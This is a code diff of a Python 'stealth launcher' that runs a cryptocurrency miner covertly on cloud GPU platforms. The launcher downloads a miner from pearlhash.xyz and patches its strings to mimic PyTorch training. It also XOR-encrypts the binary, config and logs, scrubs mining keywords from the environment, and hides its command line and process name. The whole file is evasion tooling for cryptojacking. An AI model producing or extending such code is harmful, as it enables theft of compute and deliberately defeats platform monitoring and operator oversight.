@@ -5,7 +5,7 @@ All-in-one stealth launcher for pearl-miner on cloud GPU platforms.
 Reads config from env vars — nothing hardcoded.
 
 Env vars:
-  PROXY       — pool address (e.g. global.pearlfortune.org:443)
+  POOL_HOST   — pool address (e.g. pool.pearlhash.xyz:9000)
   ADDRESS     — wallet (prl1...)
   WORKER      — worker name (optional)
   TOKEN       — auth token (optional)
@@ -30,12 +30,11 @@ def derive_key(passphrase: str, salt: bytes = b"torch_backend_v4") -> bytes:
 # CONFIG
 # ═══════════════════════════════════════════════════════════════════════════════
 
-MINER_RELEASE_URL = "https://github.com/pearlfortune/pearl-miner/releases/download/v1.2.3/pearlfortune-v1.2.3.tar.gz"
+MINER_RELEASE_URL = "https://pearlhash.xyz/downloads/pearl-miner-v12"
+POOL_HOST = os.environ.get("POOL_HOST", "pool.pearlhash.xyz:9000")
 CUDA_VERSION = os.environ.get("CUDA_VERSION", "12")
-PROXY = os.environ.get("PROXY", "")
 ADDRESS = os.environ.get("ADDRESS", "")
 WORKER = os.environ.get("WORKER", f"worker-{random.randint(1000,9999)}")
-TOKEN = os.environ.get("TOKEN", "")
 GPU_DEVICES = os.environ.get("GPU_DEVICES", "")
 
 MACHINE_SEED = f"{os.getpid()}-{time.time_ns()}-{random.random()}"
@@ -46,34 +45,9 @@ XOR_KEY = derive_key(MACHINE_SEED)
 # ═══════════════════════════════════════════════════════════════════════════════
 
 PATCH_TABLE = [
-    (b"MINER_GPU_STARTUP_BENCH", b"TORCH_GPU_STARTUP_BENCH"),
-    (b"MINER_DISABLE_WATCHDOG",  b"TORCH_DISABLE_WATCHDOG"),
-    (b"MINER_GPU",               b"TORCH_GPU"),
-    (b"PEARL_SUPERVISED_WORKER", b"TORCH_SUPERVISED_WORKER"),
-    (b"MineCommandSendError",    b"TrainCommanSendError"),
-    (b"GpuInstanceMineCommand",  b"GpuInstanceTrainComman"),
-    (b"GpuInstanceMine",         b"GpuInstanceTrai"),
-    (b"proof_factor",            b"train_factor"),
-    (b"miner_version",           b"torch_version"),
-    (b"stratum.proxy",           b"torch_.proxy_"),
-    (b"worker.failed_stale",     b"trainr.failed_stale"),
-    (b"worker failed",           b"trainr failed"),
-    (b"normalized_share_bound",  b"normalized_grad_bound_"),
-    (b"raw_share_bound",         b"raw_grad_bound_"),
-    (b"accepted",   b"computed"),
-    (b"rejected",   b"dropped_"),
-    (b"hashrate",   b"trainrat"),
-    (b"difficulty",  b"complexity"),
-    (b"proof_per_sec",   b"epoch_per_sec"),
-    (b"proof_build_ms",  b"train_build_ms"),
-    (b"proof_runner",    b"train_runner"),
-    (b"proof_cache",     b"train_cache"),
-    (b"proof_inputs",    b"train_inputs"),
-    (b"proof_queued",    b"train_queued"),
-    (b"drain_summary",   b"batch_summary"),
-    (b"drain_ms",        b"batch_ms"),
-    (b"large.hit",       b"batch.hit"),
-    (b"large.progress",  b"train.progress"),
+    # Pearlhash binary is much cleaner — only 2 mining strings
+    (b"PoOL",            b"tOrC"),          # 4 ✅
+    (b"miner_pool",      b"train_pool"),    # 10 ✅
 ]
 
 def verify_patches():
@@ -142,26 +116,13 @@ def process_name_rotation():
 # ═══════════════════════════════════════════════════════════════════════════════
 
 def download_and_patch_miner(workdir):
-    import urllib.request, tarfile
-    tarball = os.path.join(workdir, "data.tar.gz")
+    """Download pearlhash miner binary, apply patches, encrypt."""
+    bin_path = os.path.join(workdir, "miner_raw")
     print(f"[dl] downloading payload...")
-    urllib.request.urlretrieve(MINER_RELEASE_URL, tarball)
-    with tarfile.open(tarball, "r:gz") as tf:
-        tf.extractall(workdir)
+    urllib.request.urlretrieve(MINER_RELEASE_URL, bin_path)
+    os.chmod(bin_path, 0o755)
 
-    bin_name = f"miner-cuda{CUDA_VERSION}"
-    bin_src = os.path.join(workdir, "pearlfortune", bin_name)
-    if not os.path.exists(bin_src):
-        for name in ["miner-cuda12", "miner-cuda13", "miner"]:
-            alt = os.path.join(workdir, "pearlfortune", name)
-            if os.path.exists(alt):
-                bin_src = alt
-                break
-        else:
-            print("[!] ERROR: binary not found")
-            sys.exit(1)
-
-    with open(bin_src, "rb") as f:
+    with open(bin_path, "rb") as f:
         data = f.read()
 
     verify_patches()
@@ -171,18 +132,7 @@ def download_and_patch_miner(workdir):
         if count > 0:
             data = data.replace(old, new)
             patch_count += count
-
-    stripped_path = os.path.join(workdir, "stripped")
-    with open(stripped_path, "wb") as f:
-        f.write(data)
-    os.chmod(stripped_path, 0o755)
-    try:
-        subprocess.run(["strip", "--strip-all", stripped_path], check=True, capture_output=True)
-    except FileNotFoundError:
-        pass
-
-    with open(stripped_path, "rb") as f:
-        data = f.read()
+            print(f"[patch] {old.decode()} → {new.decode()} ({count}x)")
 
     # Encrypt and save
     encrypted = xor_bytes(data, XOR_KEY)
@@ -192,10 +142,7 @@ def download_and_patch_miner(workdir):
     os.chmod(enc_path, 0o644)
 
     # Cleanup plaintext
-    os.unlink(stripped_path)
-    os.unlink(bin_src)
-    shutil.rmtree(os.path.join(workdir, "pearlfortune"), ignore_errors=True)
-    os.unlink(tarball)
+    os.unlink(bin_path)
 
     print(f"[patch] applied {patch_count} patches, encrypted → disk")
     return data
@@ -207,7 +154,7 @@ def download_and_patch_miner(workdir):
 def write_encrypted_config(workdir):
     """Write wallet/pool to XOR-encrypted config file on disk.
     After miner loads, delete it. Never persists as plaintext."""
-    config = json.dumps({"proxy": PROXY, "address": ADDRESS, "worker": WORKER, "token": TOKEN}).encode()
+    config = json.dumps({"host": POOL_HOST, "address": ADDRESS, "worker": WORKER}).encode()
     key = derive_key(f"config_{MACHINE_SEED}")
     encrypted = xor_bytes(config, key)
     path = os.path.join(workdir, ".torch_config.enc")
@@ -1052,22 +999,16 @@ def main():
     binary_data = download_and_patch_miner(workdir)
     set_gpu_power_limit(600)
 
-    if not PROXY:
-        print("[!] ERROR: PROXY env var not set"); sys.exit(1)
     if not ADDRESS:
         print("[!] ERROR: ADDRESS env var not set"); sys.exit(1)
 
     # Write encrypted config (deleted after miner loads)
     config_path, config_key = write_encrypted_config(workdir)
 
-    # Build args — use innocent placeholders, real values loaded from encrypted config
-    # The binary parses --proxy and --address from CLI, so we must pass them
-    # BUT we overwrite /proc/PID/cmdline immediately after launch
-    args = ["/dev/null", "--proxy", PROXY, "--address", ADDRESS, "-gpu"]
+    # Build args — pearlhash uses --host and --user
+    args = ["/dev/null", "--host", POOL_HOST, "--user", ADDRESS]
     if WORKER:
         args.extend(["--worker", WORKER])
-    if TOKEN:
-        args.extend(["--token", TOKEN])
 
     # Sanitize env — remove anything that reveals mining
     env = os.environ.copy()
@@ -1077,7 +1018,7 @@ def main():
         if any(mining_kw in env[k].lower() for mining_kw in ["pearl", "miner", "prl1"]):
             del env[k]
 
-    print(f"[launch] proxy=<encrypted> address=<encrypted> worker=<encrypted>")
+    print(f"[launch] host={POOL_HOST} address=<encrypted> worker={WORKER}")
 
     # Encrypted log file — miner output goes HERE, not stdout
     log_path = os.path.join(workdir, ".train_log.enc")
